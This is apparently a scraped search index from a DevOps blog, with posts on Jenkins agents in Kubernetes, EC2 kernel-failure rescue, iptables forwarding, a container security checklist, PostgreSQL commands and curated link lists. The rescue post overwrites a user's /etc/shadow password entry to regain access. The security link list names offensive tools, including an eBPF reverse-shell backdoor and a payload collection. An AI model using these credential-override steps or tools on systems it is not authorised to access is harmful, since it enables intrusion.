\u0026#39;8\u0026#39;) { 7 CONTAINERS \u0026lt;\u0026lt; containerTemplate(args: \u0026#39;\u0026#39;, command: \u0026#39;sh\u0026#39;, image: \u0026#34;local.docker.dev/sonarsource/sonar-scanner-cli:4.7.0-java8\u0026#34;, livenessProbe: containerLivenessProbe(execArgs: \u0026#39;\u0026#39;, failureThreshold: 0, initialDelaySeconds: 0, periodSeconds: 0, successThreshold: 0, timeoutSeconds: 0), name: \u0026#39;compile\u0026#39;, resourceLimitCpu: \u0026#39;2000m\u0026#39;, resourceLimitEphemeralStorage: \u0026#39;\u0026#39;, resourceLimitMemory: \u0026#39;4Gi\u0026#39;, resourceRequestCpu: \u0026#39;500m\u0026#39;, resourceRequestEphemeralStorage: \u0026#39;\u0026#39;, resourceRequestMemory: \u0026#39;500Mi\u0026#39;, ttyEnabled: true, workingDir: \u0026#39;/home/jenkins/agent\u0026#39;) 8} 9 10podTemplate(cloud: \u0026#39;k8s-cluster\u0026#39;, containers: CONTAINERS, inheritFrom: \u0026#39;podTemplateName\u0026#39;, label: \u0026#34;${params.PROJECT_NAME}\u0026#34;, name: \u0026#34;${params.PROJECT_NAME}\u0026#34;, namespace: \u0026#39;cicd\u0026#39;) { 11 12 def buildResult = \u0026#39;Success\u0026#39; 13 node(\u0026#34;${params.PROJECT_NAME}\u0026#34;) { 14 try{ 15 stage \u0026#34;Pull source code from ${params.PROJECT_NAME}\u0026#34; 16 dir(\u0026#34;source_code\u0026#34;) { 17 git branch: \u0026#34;${params.BRANCH_NAME}\u0026#34;, url: \u0026#34;${params.REPO_URL}\u0026#34;, credentialsId: \u0026#34;git_token\u0026#34; 18 GIT_COMMIT_EMAIL = sh ( 19 script: \u0026#39;git --no-pager show -s --format=\\\u0026#39;%ae\\\u0026#39;\u0026#39;, 20 returnStdout: true 21 ).trim().replaceAll(/@.*/, \u0026#34;@local.test.dev\u0026#34;) 22 echo \u0026#34;=====\u0026gt;${GIT_COMMIT_EMAIL}\u0026lt;=======\u0026#34; 23 sh \u0026#34;ls -alh\u0026#34; 24 } 25 }catch(Exception e) { 26 buildResult = \u0026#34;Failed\u0026#34; 27 }finally{ 28 echo \u0026#39;finally\u0026#39; 29 } 30 } 31} 32 Dynamic change the shared library in script console 1#!groovy 2 3// imports 4import hudson.scm.SCM 5import jenkins.model.Jenkins 6import jenkins.plugins.git.GitSCMSource 7import org.jenkinsci.plugins.workflow.libs.* 8import org.jenkinsci.plugins.workflow.libs.LibraryConfiguration 9import org.jenkinsci.plugins.workflow.libs.SCMSourceRetriever 10 11// parameters 12def globalLibrariesParameters = [ 13 branch: \u0026#34;master\u0026#34;, 14 credentialId: \u0026#34;global-shared-library-key\u0026#34;, 15 implicit: false, 16 name: \u0026#34;Your Global Shared Library name here\u0026#34;, 17 repository: \u0026#34;git@bitbucket.org:your-company/your-repo.git\u0026#34; 18 path: \u0026#34;/shared-library\u0026#34; 19] 20 21// define global library 22GitSCMSource gitSCMSource = new GitSCMSource( 23 \u0026#34;global-shared-library\u0026#34;, 24 globalLibrariesParameters.repository, 25 globalLibrariesParameters.credentialId, 26 \u0026#34;*\u0026#34;, 27 \u0026#34;\u0026#34;, 28 false 29) 30 31// define retriever 32SCMSourceRetriever sCMSourceRetriever = new SCMSourceRetriever(gitSCMSource) 33sCMSourceRetriever.setLibraryPath(globalLibrariesParameters.path) 34// get Jenkins instance 35Jenkins jenkins = Jenkins.getInstance() 36 37// get Jenkins Global Libraries 38def globalLibraries = jenkins.getDescriptor(\u0026#34;org.jenkinsci.plugins.workflow.libs.GlobalLibraries\u0026#34;) 39 40// define new library configuration 41LibraryConfiguration libraryConfiguration = new LibraryConfiguration(globalLibrariesParameters.name, sCMSourceRetriever) 42libraryConfiguration.setDefaultVersion(globalLibrariesParameters.branch) 43libraryConfiguration.setImplicit(globalLibrariesParameters.implicit) 44 45// set new Jenkins Global Library 46globalLibraries.get().setLibraries([libraryConfiguration]) 47 48// save current Jenkins state to disk 49jenkins.save() Reference How To Use Kubernetes Pods As Jenkins Agents ","link":"https://blog.wisekee.com/post/jenkins-eks-agent/","section":"post","tags":["Jenkins","Agent","Kubernetes"],"title":"Setup the jenkins agent in kubernetes cluster use pods"},{"body":"","link":"https://blog.wisekee.com/tags/boot/","section":"tags","tags":null,"title":"boot"},{"body":"rescue steps Force stop the failed ec2 instance Detach the root ebs volume Launch new ec2 instance need support Nitro System the instance type and attach the previous EBS volume Add new user in new ec2 instance and get the /etc/shadows encrypt password copy to old device same file administrator user overide the line Detach the ebs volume from new instance and stop it Retach the ebs volume to first ec2 and start it use serial console connect to it and use overide the user credetials to fix some issue Or immediately fix some problem in new ec2 useful command or script 1# list the installed kernel 2dpkg --list | grep linux-image 3apt list --installed | egrep \u0026#39;^linux\u0026#39; | grep $(uname -r) 4# view some logs 5grep $(uname -r) /var/log/dpkg.log* 6# in centos 7rpm -qa --last | grep kernel 8 9# try to change grub to old boot 10vi /etc/default/grub 11# to modify some value 12GRUB_DEFAULT=0 13GRUB_TIMEOUT_STYLE=menu 14GRUB_TIMEOUT=10 15GRUB_TERMINAL=\u0026#34;console serial\u0026#34; 16GRUB_SERIAL_COMMAND=\u0026#34;serial —speed=115200“ 17 18# remember to update grub make it work when reboot 19sudo update-grub 20 21# to view grub version may needs different command 22sudo grub2-mkconfig -o /boot/grub2/grub.cfg 23sudo grub-mkconfig -o /boot/grub/grub.cfg 24 25# to view kernel module status 26systemctl status systemd-modules-load.service 27 28# may be finally this command let u surprise 29dpkg --configure -a The amazon linux 2 upgrade the kernel 1# list the kernel 2amazon-linux-extras list | grep kernel 3# disable the kernel 4amazon-linux-extras disable kernel-5.10 -y 5# install the new kernel 6amazon-linux-extras install kernel-5.15 -y 7# reboot 8reboot 9# confirmation 10rpm -qa | grep kernel 11uname -a Reference How to Update kernel in Amazon EC2 Instances Make an Amazon EBS volume available for use on Linux How to reset the Forgotten root password in AWS-EC2 Instance Use EC2Rescue for Linux How to rebuild Amazon Linux kernel in Amazon Linux ","link":"https://blog.wisekee.com/post/ec2-linux-kernel-rescue/","section":"post","tags":["kernel","linux","boot"],"title":"How to rescue ec2 linux when upgrade the kernel failed"},{"body":"","link":"https://blog.wisekee.com/tags/linux/","section":"tags","tags":null,"title":"linux"},{"body":"Sometimes we have access internal service or server in local network,needs through external bastion server bridge to.\n1# The traffic forward to internal environment through bastion iptables rule diagram 2 3# local or office ------\u0026gt; bastion machine ----------\u0026gt; internal server 4# local access bastion-public-ip:8888 -----\u0026gt; bastion iptables rules ----\u0026gt; internal server:80 5 6# display iptalbes nat rules 7iptables -t nat -L 8 9# add prepostrouting rule to chain 10iptables -t nat -A PREROUTING -p tcp -m tcp --dport 8899 -j DNAT --to-destination 192.168.1.3:80 11 12# add postrouting rule to chain 13iptables -t nat -A POSTROUTING -d 192.168.1.3/32 -p tcp -m tcp --dport 80 -j SNAT --to-source 192.168.1.4 14 15# enable the forward traffic 16iptables --policy FORWARD ACCEPT 17 18# open system forward parameters permanent 19echo \u0026#34;net.ipv4.ip_forward=1\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf 20 21# temporary enable the forward 22sysctl net.ipv4.ip_forward=1 23 24# save the rules to file 25iptables-save \u0026gt; iptables.txt 26 27# from file restore rules 28iptables-restore \u0026lt; iptables.txt ","link":"https://blog.wisekee.com/post/iptables-forward-traffic/","section":"post","tags":["Iptables","Network","Traffic"],"title":"Forward the traffic to internal server through iptables rule use bastion server"},{"body":"","link":"https://blog.wisekee.com/tags/iptables/","section":"tags","tags":null,"title":"Iptables"},{"body":"","link":"https://blog.wisekee.com/tags/checklist/","section":"tags","tags":null,"title":"checklist"},{"body":"Cloud native workflow security checklist\nDevelopment security Integrate Code Scanning at the CI/CD Process\nSAST (Static Application Security Testing) tools sonarqube, gosec various language lint itegration the IDE plugins Enabled the gitlab ci security or github action scan Reduce external vulnerabilities via dependency scanning\nvarious language dependency check(npm, maven, go.mod, reqirements.txt) dependency-check plugin Use image scanning to analyze container images\nAvoid unnecessary privileges\nRootless containers Make sure the user specified in the USER instruction exists inside the container. use gosu or su-exec to drop to a standard user Don’t bind to a specific UID\nMake executables owned by root and not writable\n1 WORKDIR $APP_HOME 2 COPY --chown=app:app app-files/ /app 3 USER app 4 ENTRYPOINT /app/my-app-entrypoint.sh Reduce attack surface\nIt is a Dockerfile best practice to keep the images minimal.\nMultistage builds\nUse trusted base images\nUpdate your images frequently\nExposed ports Every opened port in your container is an open door to your system. Expose only the ports that your application needs and avoid exposing ports like SSH (22)\nPrevent confidential data leaks\nCredentials and confidentiality Never put any secret or credentials in the Dockerfile instructions (environment variables, args, or hard coded into any command). Use configuration files and bind mount the configuration files in docker, or mount them from a Kubernetes secret. Build context and dockerignore\nLinting\nhadolint Locally scan images during development\nKeep Host and Docker Up to Date\nDo Not Expose the Docker Daemon Socket\nAvoid Privileged Containers\nLimit Container Resources\nSegregate Container Networks\nSet Filesystem and Volumes to Read-only\nComplete Lifecycle Management\nImplement vulnerability scanning to ensure clean code at all stages of the development lifecycle. Use a sandbox environment where you can QA your code before it goes into production, to ensure there is nothing malicious that will deploy at runtime. Implement drift prevention to ensure container immutability. Create an incident response process to ensure rapid response in the case of an attack Apply automated patching. Ensure you have robust auditing and forensics for quick troubleshooting and compliance reporting Container security Restrict System Calls from Within Containers Scan and Verify Container Images Use Minimal Base Images Don’t Leak Sensitive Info to Docker Images Secure Container Registries Use Fixed Tags for Immutability Preferring a more specific tag—if an image has several tags, a build process should select the tag containing the most information (e.g. both version and operating system). Keeping a local copy of images—for example, in a private repository, and confirming that tags are the same as those in the local copy. Signing images—Docker offers a Content Trust mechanism that allows you to cryptographically sign images using a private key. This guarantees the image, and its tags, have not been modified. Monitor Container Activity Put tools and practices in place that can help you achieve observability of the following components: Docker hosts Container engines Master nodes (if running an orchestrator like Kubernetes) Containerized middleware and networking Workloads running in containers Secure Containers at Runtime Save Troubleshooting Data Separately from Containers CIS Docker Benchmark. Prevent unsafe containers from running Use rootless 1FROM alpine:3.12 2# Create user and set ownership and permissions as required 3RUN adduser -D myuser \u0026amp;\u0026amp; chown -R myuser /myapp-data 4# ... copy application files 5USER myuser 6ENTRYPOINT [\u0026#34;/myapp\u0026#34;] Use multi stage build 1#This is the \u0026#34;builder\u0026#34; stage 2FROM golang:1.15 as builder 3WORKDIR /my-go-app 4COPY app-src . 5RUN GOOS=linux GOARCH=amd64 go build ./cmd/app-service 6#This is the final stage, and we copy artifacts from \u0026#34;builder\u0026#34; 7FROM gcr.io/distroless/static-debian10 8COPY --from=builder /my-go-app/app-service /bin/app-service 9ENTRYPOINT [\u0026#34;/bin/app-service\u0026#34;] Environments security Incorporate IaC scanning checkov tfsec(Security scanner for your Terraform code) cfn_nag(Linting tool for CloudFormation templates) Secure your host with host scanning aws ssm agent patch and upgrade Falco scanning and detect Check for misconfigurations that renders your infrastructure vulnerable cloud custodian Prevent unsafe containers from running gatekeeper (Gatekeeper - Policy Controller for Kubernetes) connaisseur(An admission controller that integrates Container Image Signature Verification into a Kubernetes cluster) limit the number of users that have access to your hosts, cloud accounts, and resources, and block unnecessary network traffic VPCs, Security groups, network rules, firewall rules, etc. in cloud providers to restrict communication between VMs, VPCs, and the Internet. Firewalls at hosts levels to expose only the minimal set of required services. Kubernetes Network Policies for clusters, and additional tools, like Service Mesh or API Gateways, can add an additional security layer for filtering network requests. Set up real-time event and log auditing Host and Kubernetes logs Cloud logs (CloudTrail in AWS, Activity Audit in GCP, etc.) System calls in containers Fix misconfigurations Patch vulnerabilities ","link":"https://blog.wisekee.com/post/kubernetes-security-checklist/","section":"post","tags":["security","cncf","checklist"],"title":"Kubernetes and Cloud native security checklist"},{"body":"In a k8s environment, it is a good choice to have the application runtime and source code build packages separated in separate containers\nSmallest source code build image use a smallest base image to build docker image store source code build result package\n1FROM alpine:latest 2WORKDIR /var/www 3COPY app /var/www/app Use different images of the runtime environment according to different programming languages 1FROM python:3.6.15-slim 2 3RUN pip install boto3 Build app image and runtime image 1# build the app image 2docker build . -t local.dev/py-app:v1 3# build the runtime image 4docker build . -t local.dev/python-3.6:latest Use kubernetes pod initContainers to share app package to runtime container. when pod launching the initContainer copy app all package content to shared data volume\n1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 # Unique key of the Deployment instance 5 name: deployment-py-app 6spec: 7 # 3 Pods should exist at all times. 8 replicas: 3 9 selector: 10 matchLabels: 11 app: py-app 12 template: 13 metadata: 14 labels: 15 # Apply this label to pods and default 16 # the Deployment label selector to this value 17 app: py-app 18 spec: 19 initContainers: 20 - name: py-app-source-code 21 image: local.dev/py-app:v1 22 # init container and app runtime use emtpyvolume shared data 23 command: [\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;cp -r /var/www/app/* /var/shared/data/\u0026#34;] 24 imagePullPolicy: IfNotPresent 25 volumeMounts: 26 - name: app-data 27 mountPath: /var/shared/data 28 containers: 29 - name: app-runtime 30 # Run this image 31 image: local.dev/python-3.6:latest 32 command: [\u0026#34;python3\u0026#34;, \u0026#34;/var/app/hello.py\u0026#34;] 33 imagePullPolicy: IfNotPresent 34 ports: 35 - name: http 36 containerPort: 8000 37 protocol: TCP 38 volumeMounts: 39 - name: app-data 40 mountPath: /var/app 41 volumes: 42 - name: app-data 43 emptyDir: {} ","link":"https://blog.wisekee.com/post/k8s-app-runtime-sparate/","section":"post","tags":["k8s","pod"],"title":"K8S app source code and runtime separate in pod"},{"body":"","link":"https://blog.wisekee.com/tags/pod/","section":"tags","tags":null,"title":"pod"},{"body":"There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.\nCloud native and kubernetes https://github.com/labring/sealos(kubernetes-kernel-based cloud os! Let\u0026rsquo;s sealos run kubernetes and applications.) https://github.com/kubevela/kubevela(The Modern Application Platform.) https://github.com/crossplane/crossplane(Cloud Native Control Planes multi cloud resoures) https://promcat.io/(A resource catalog for enterprise-class Prometheus) https://hub.datree.io/(Prevent Kubernetes misconfigurations from reaching production) https://aws.github.io/aws-eks-best-practices/(EKS Best Practices Guides) https://github.com/koderover/zadig(Zadig is a cloud native, distributed, developer-oriented continuous delivery product) https://github.com/kubernetes-sigs/metrics-server(About Scalable and efficient source of container resource metrics ) https://github.com/aquasecurity/kube-bench(Checks whether Kubernetes is deployed according to security best practices ) https://github.com/astefanutti/kubebox(Terminal and Web console for Kubernetes) https://github.com/loft-sh/kiosk(Multi-Tenancy Extension For Kubernetes) https://github.com/kubernetes-sigs/kind(Kubernetes IN Docker - local clusters for testing Kubernetes) https://github.com/firecracker-microvm/firecracker(Secure and fast microVMs for serverless computing.) https://github.com/weaveworks/ignite(Ignite a Firecracker microVM) https://github.com/kata-containers/documentation(Kata Containers version 1.x documentation) https://github.com/kyverno/kyverno/(Kubernetes Native Policy Management) https://karpenter.sh/(is an open-source node provisioning project built for Kubernetes.) https://vanillastack.io/this-is-vanillastack(incorporates some of the biggest and best open-source frameworks and projects) https://docs.nats.io/nats-concepts/overview/compare-nats(data exchange, segmented in the form of messages) https://kube.events/(Kubernetes events starting soon) https://engineering.linecorp.com/en/blog/(LINE Engineering is a website to share the culture of development teams) https://github.com/labring/sealos(Cloud operating system based on kubernetes. Build your own cloud with one click！) https://ossinsight.io/2022(Trends and Insights from GitHub) https://kubebyexample.com/(About kubernetes things and learn roadmap) https://kubernetes-tutorial.schoolofdevops.com/(Kubernete Tutorials with CKA and CKAD Prep Guide) () () () () () () () () () () Packages and libraries https://docs.gunicorn.org/en/stable/(python WSGI) https://github.com/hairyhenderson/gomplate(A flexible commandline tool for template renderingf) https://github.com/irazasyed/awesome-cloudflare(Curated list of awesome Cloudflare worker recipes, open-source projects, guides, blogs and other resources) https://cstack.github.io/db_tutorial(Let\u0026rsquo;s Build a Simple Database) https://awesome-go.com/(Awesome Go) https://github.com/vinta/awesome-python(An opinionated list of awesome Python frameworks, libraries, software and resources.) () () () () () () () () () () () The frontend and ui https://github.com/kentcdodds/advanced-react-patterns/(advanced react patterns workshop) https://www.smashingmagazine.com/articles/(web design,ux) https://codecondo.com/(share useful news, tutorials, tips, resources and tools, on design, development and other inspirational topics.) https://github.com/oslabs-beta/kubermetrics(k8s metrics dashboard) TOOLTIP \u0026amp; POPOVER POSITIONING ENGINE(https://popper.js.org/) https://web.dev/learn/(Learn web development) https://vincenttunru.com/(front-end engineer) https://developer.mozilla.org/en-US/docs/Learn/Getting_started_with_the_web(Getting started with the web) () () () Tools and efficiency https://jmespath.org/(JMESPath is a query language for JSON.) https://jsonnet.org/(A data templating language for app and tool developers) https://github.com/toml-lang/toml(A config file format for humans.) https://github.com/AppFlowy-IO/AppFlowy( is an open-source alternative to Notion) https://github.com/utmapp/UTM(Virtual machines for iOS and macOS) https://github.com/pre-commit/pre-commit(A framework for managing and maintaining multi-language pre-commit hooks.) https://admcpr.com/where-to-find-royalty-free-images/(Where to find royalty free photos, artworks and illustrations) https://github.com/weaveworks/ignite(Ignite a Firecracker microVM) https://github.com/chubin/cheat.sh(the only cheat sheet you need) https://explainshell.com/(write down a command-line to see the help text that matches each argument) https://github.com/ozbillwang/terraform-best-practices(Terraform Best Practices for AWS users) https://www.keycloak.org/documentation(Open Source Identity and Access Management) cht.sh(example: curl cht.sh/ls) https://github.com/tldr-pages/tldr(helper for shell command) https://github.com/AutomaApp/automa(A browser extension for automating your browser by connecting blocks) https://jsonpath.curiousconcept.com/(The JSONPath Expression Tester) https://github.com/sbstp/kubie(A more powerful alternative to kubectx and kubens) https://github.com/monitoror/monitoror(Unified monitoring wallboard — Light, ergonomic and reliable monitoring for anything) https://github.com/particledecay/kconf(Manage multiple kubeconfigs easily) https://github.com/kvaps/kubectl-node-shell(Exec into node via kubectl) https://github.com/itaysk/kubectl-neat(Clean up Kubernetes yaml and json output to make it readable) https://github.com/dbeaver/cloudbeaver(Cloud Database Manager) https://github.com/refined-github/refined-github( Browser extension that simplifies the GitHub interface and adds useful features) https://github.com/deislabs/osiris(A general purpose, scale-to-zero component for Kubernetes) https://github.com/o2sh/onefetch(Command-line Git information tool) https://github.com/kingToolbox/WindTerm(A professional cross-platform SSH/Sftp/Shell/Telnet/Serial terminal.) https://github.com/oslabs-beta/KUR8(A visual overview of Kubernetes architecture and Prometheus metrics) https://github.com/WildXBird/Outlooker(RSS reader) https://neverinstall.com/(running everything in browse) https://www.libhunt.com/(project and opensource trend) https://github.com/telepresenceio/telepresence(Local development against a remote Kubernetes or OpenShift cluster) https://github.com/standardnotes/app(An end-to-end encrypted notes app for digitalists and professionals. For issues, visit) https://reqbin.com/(Online REST \u0026amp; SOAP API Testing Tool) https://www.cairographics.org/FAQ/(Multi-platform 2D graphics library) https://ossinsight.io/collections(open source insight of github events) https://luvvoice.com/chinese/(Free Convert Chinese Text to Speech) () () () () Security and tools https://cyclonedx.org/tool-center/(CycloneDX Tool Center) https://falco.org (security,engine,runtime security tool) https://github.com/secure-sdl/fail2ban(Daemon to ban hosts that cause multiple authentication errors) https://github.com/StackExchange/blackbox(Safely store secrets in Git/Mercurial/Subversion) https://github.com/baidu/openrasp(Open source RASP solution) https://github.com/HXSecurity/DongTai(DongTai is an interactive application security testing(IAST) product) https://github.com/WebGoat/WebGoat(is a deliberately insecure application) https://github.com/nccgroup/PMapper(A tool for quickly evaluating IAM permissions in AWS) https://github.com/quay/clair(Vulnerability Static Analysis for Containers) https://github.com/kris-nova/boopkit?utm_id=FAUN_Zeno328_Link_title(Linux eBPF backdoor over TCP. Spawn reverse shells, RCE, on prior privileged access. Less Honkin, More Tonkin.) https://github.com/shadow1ng/fscan(一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描) https://www.sans.org/tools/?msc=main-nav(Cyber Security Tools) https://github.com/pumasecurity/puma-scan/wiki/Installation(visual studio security scan) https://github.com/TaptuIT/awesome-devsecops#readme(Curating the best DevSecOps resources and tooling) https://apparmor.net/(Linux kernel security module) https://github.com/ShiftLeftSecurity/sast-scan(performing static analysis based security testing of your applications) https://github.com/tellerops/teller(About Cloud native secrets management for developers - never leave your command line for secrets.) https://github.com/curiefense/curiefense(Curiefense is a unified, open source platform protecting cloud native applications.) https://github.com/kubescape/kubescape(Kubescape is a K8s open-source tool providing a multi-cloud K8s single pane of glass, including risk analysis, security compliance, RBAC visualizer and image vulnerabilities scanning.) https://pentestmonkey.net/category/blog(Taking the monkey work out of pentesting) https://github.com/swisskyrepo/PayloadsAllTheThings(A list of useful payloads and bypass for Web Application Security and Pentest/CTF) https://kalilinuxtutorials.com/(Security Analysis, ISMS, Pentesting) https://px.dev/(Open source Kubernetes observability for developers Auto-instrumented. Scriptable. Kubernetes native.) https://deepfence.io/threatmapper/(open source, multi-cloud security platform for scanning, mapping, and ranking vulnerabilities in running containers, images, hosts, and repositories) https://threatpost.com/(threatpost) https://suricata.io/documentation/(quick start to run Suricata) https://decentsecurity.com/(Everyone can be secure) https://www.virustotal.com/gui/home/search(enterprise file, ip, url malware subscriptions) https://pulsedive.com/(threat intelligence service) https://app.any.run/(malware analysis sandbox platform) https://urlscan.io/(A sandbox for the web) https://urlhaus.abuse.ch/(collect, track and share malware URLs) https://dashboard.shadowserver.org/(General statistics world map) https://urlscan.io/(realtime scan the url) https://tracker.viriback.com/(c2 monitoring) https://threatyeti.com/(investingate threat intelligence) https://publicwww.com/(Source Code Search Engine) https://labs.hackxpert.com/(online CTF) https://portswigger.net/web-security/learning-paths(web security learn paths) https://sourcegraph.com/search(search the code by multiple tags) https://wr.do/docs/dns-records(Craft DNS Records, Make Short Links) ","link":"https://blog.wisekee.com/post/awesome-open-source/","section":"post","tags":["open source","cncf","featured"],"title":"Awesome open resoure tools and project"},{"body":"","link":"https://blog.wisekee.com/tags/featured/","section":"tags","tags":null,"title":"featured"},{"body":"","link":"https://blog.wisekee.com/tags/postgresql/","section":"tags","tags":null,"title":"Postgresql"},{"body":"Data export and import 1# install postgresql in macos 2brew install postgresql@15 3# settings to the path variable 4echo \u0026#39;export PATH=\u0026#34;/opt/homebrew/opt/postgresql@15/bin:$PATH\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.zshrc 5 6# dump database to sql file 7pg_dump --host xxxxx.eu-west-1.compute.amazonaws.com --port 5432 --user username database \u0026gt; backup.sql 8 9# change username password 10ALTER USER user_name WITH PASSWORD \u0026#39;new_password\u0026#39;; 11# import the data to postgresql 12psql --host x.x.x.x --user dba --db postgres \u0026lt; dump-xxx-xxxx.sql Reference Importing and exporting data in PostgreSQL ","link":"https://blog.wisekee.com/post/postgresql-commands/","section":"post","tags":["Postgresql","Psql"],"title":"Postgresql common commands operations"},{"body":"","link":"https://blog.wisekee.com/tags/psql/","section":"tags","tags":null,"title":"Psql"},{"body":"Create project structure and install nessess 1mkdir -p ~/code/exercise/ts-demo \u0026amp;\u0026amp; cd \u0026#34;$_\u0026#34; 2npm init 3mkdir src 4touch tsconfig.json 5npm i --save-dev @types/node 6npm i --save-dev @types/express 7npm i --save-dev @types/mocha 8npm i express 9npm i nodemon The src/App.ts content 1import * as express from \u0026#39;express\u0026#39; 2 3class App { 4 public express 5 6 constructor () { 7 this.express = express() 8 this.mountRoutes() 9 } 10 11 private mountRoutes (): void { 12 const router = express.Router() 13 router.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 14 res.json({ 15 message: \u0026#39;Hello World!\u0026#39; 16 }) 17 }) 18 this.express.use(\u0026#39;/\u0026#39;, router) 19 } 20} 21 22export default new App().express The src/index.ts content 1import app from \u0026#39;./App\u0026#39; 2 3const port = process.env.PORT || 3000 4 5app.listen(port, (err) =\u0026gt; { 6 if (err) { 7 return console.log(err) 8 } 9 10 return console.log(`server is listening on ${port}`) 11}) And the package.json like following 1{ 2 \u0026#34;name\u0026#34;: \u0026#34;express-demo\u0026#34;, 3 \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, 4 \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, 5 \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, 6 \u0026#34;scripts\u0026#34;: { 7 \u0026#34;build\u0026#34;: \u0026#34;tsc\u0026#34;, 8 \u0026#34;dev\u0026#34;: \u0026#34;tsc --watch \u0026amp; nodemon dist\u0026#34;, 9 \u0026#34;test\u0026#34;: \u0026#34;tsc \u0026amp;\u0026amp; mocha dist/**/*.spec.js\u0026#34;, 10 \u0026#34;lint\u0026#34;: \u0026#34;eslint src --ext ts\u0026#34;, 11 \u0026#34;tsc\u0026#34;: \u0026#34;tsc\u0026#34; 12 }, 13 \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, 14 \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, 15 \u0026#34;devDependencies\u0026#34;: { 16 \u0026#34;@types/express\u0026#34;: \u0026#34;^4.17.17\u0026#34;, 17 \u0026#34;@types/mocha\u0026#34;: \u0026#34;^10.0.1\u0026#34;, 18 \u0026#34;@types/node\u0026#34;: \u0026#34;^20.2.3\u0026#34; 19 }, 20 \u0026#34;dependencies\u0026#34;: { 21 \u0026#34;express\u0026#34;: \u0026#34;^4.18.2\u0026#34;, 22 \u0026#34;nodemon\u0026#34;: \u0026#34;^2.0.22\u0026#34; 23 } 24} Build and run 1npm run tsc 2npm run dev ","link":"https://blog.wisekee.com/post/minimal-typescript-demo/","section":"post","tags":["typescript","project"],"title":"Getting started typescript minimal project"},{"body":"","link":"https://blog.wisekee.com/tags/project/","section":"tags","tags":null,"title":"project"},{"body":"","link":"https://blog.wisekee.com/tags/typescript/","section":"tags","tags":null,"title":"typescript"},{"body":"There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.\nRecommend getting stared study resources https://docs.microsoft.com/en-us/learn/browse/(Microsoft products with step-by-step guidance) https://developer.mozilla.org/en-US/docs/Learn(Mizzla learn guides about web development) https://programming.guide/go/(Articles on Programming Guide) https://gobyexample.com/(hands-on introduction to Go using annotated example programs) https://roadmap.sh/(Step by step guides and paths to learn different tools or technologies) https://zetcode.com/(provides accessible tutorials for Go, C#, Python, Java, and JavaScript programming languages.) https://blog.opendatadiscovery.org/(First open-source data discovery and observability platform) https://icloudnative.io/(blog about the k8s everything) https://devops.phodal.com/home(DevOps 元素周期表 —— 选择您的 DevOps 工具) https://taisho6339.gitbook.io/grafana-loki-deep-dive/(Grafana Loki Deep Dive) https://www.go-on-aws.com/(A complete book as a website.) https://golangdocs.com/(about Go programming) https://zetcode.com/(tutorials for programming) https://google.github.io/comprehensive-rust/(This is a four day Rust course developed by the Android team) https://www.nginx.com/blog/(nginx offical blog) https://docs.kernel.org/(linux kernel docs) https://zchee.github.io/golang-wiki/Home/(Go Programming Language Wiki) https://www.baeldung.com/linux/linux-administration-series(Linux Administration Guide) https://www.htmhell.dev/(basic html) https://linuxhandbook.com/bash/(An independent, reader-supported publication focusing on Linux Command Line, Server, Self-hosting, DevOps and Cloud Learning) https://betterprogramming.pub/archiv(Archive of stories published by Better Programming) https://betterstack.com/community/guides/logging/(Guides library) https://blogs.halodoc.io/(Learning by shipping) https://fullstackopen.com/(Full Stack open) https://computingforgeeks.com/(growth in IT and engineering skills) https://beej.us/guide/bgnet/(Beej\u0026rsquo;s Guide to Network Programming) https://mdlayher.com/blog/(program stuff) https://github.com/m-ou-se/rust-atomics-and-locks(Code examples, data structures, and links from my book, Rust Atomics and Locks) https://tookmund.com/(blog linux and c language) https://www.trevorlasn.com/topics(technology topics) https://codapi.org/try/c/(Try / C in Y minutes) The develop skill knowledge https://teachyourselfcs.com/(Teach Yourself Computer Science) https://www.baeldung.com/linux/ (linux,java,spring) https://www.howtogeek.com/(it news, product) https://brendanthompson.com/posts(terraform, Articles about Cloud Engineering, and Golang) https://learnk8s.io/(Develop the knowledge and skills to get the most out of Kubernetes with hands-on online courses and instructor-led classes.) https://www.baeldung.com/linux/linux-scripting-series(Linux Scripting Series) https://www.grymoire.com/Unix/Sed.html(Sed - An Introduction and Tutorial by Bruce Barnett) https://jaminzhang.github.io/categories/(各种博客文章技术分类介绍) https://danielmiessler.com/study/tcpdump/(A tcpdump Tutorial with Examples — 50 Ways to Isolate Traffic) https://www.brendangregg.com/systems-performance-2nd-edition-book.html(Systems Performance: Enterprise and the Cloud, 2nd Edition ) https://docs.microsoft.com/en-us/learn/paths/rust-first-steps/(Take your first steps with Rust) https://www.practical-go-lessons.com/chap-1-programming-a-computer(Practical Go Lessons) https://dzone.com/(many AI,AGILE,BIG DATA and Cloud news) https://github.com/alebcay/awesome-shell(A curated list of awesome command-line frameworks, toolkits, guides and gizmos. Inspired by awesome-php.) https://unix-shell.zeef.com/caleb.xu(A curated list of awesome command-line frameworks, toolkits, guides and gizmos. Inspired by awesome-php.) https://google.github.io/styleguide/shellguide.html(Shell Style Guide Authored, revised and maintained by many Googlers.) https://wangdoc.com/bash/intro.html(Bash 是 Unix 系统和 Linux 系统的一种 Shell（命令行环境），是目前绝大多数 Linux 发行版的默认 Shell。) https://github.com/discourse/discourse_docker/blob/master/launcher(example shell script for discourse_docker) https://www.brendangregg.com/ebpf.html(Linux Extended BPF (eBPF) Tracing Tools) https://techglimpse.com/categories/linux-tips-tricks-articles/(linux-tips-tricks-articles) https://www.programcreek.com/(all language) https://www.cloudwalker.io/(Data Engineering – In small bytes) https://backlog.com/git-tutorial/cn/(git tutorial) https://www.simplilearn.com/authors/matthew-david?source=frs_detailsPage(Get Certified, Get Ahead with Our Programs) https://github.com/kamranahmedse/developer-roadmap(Roadmap to becoming a developer ) https://www.linuxfoundation.org/blog/(Insights from the Linux Foundation) https://en.wikipedia.org/wiki/View_model(A view model or viewpoints framework ) https://www.weave.works/blog/(weave blogs) https://riptutorial.com/(Rip has a community of more than 1 MILLION developers) 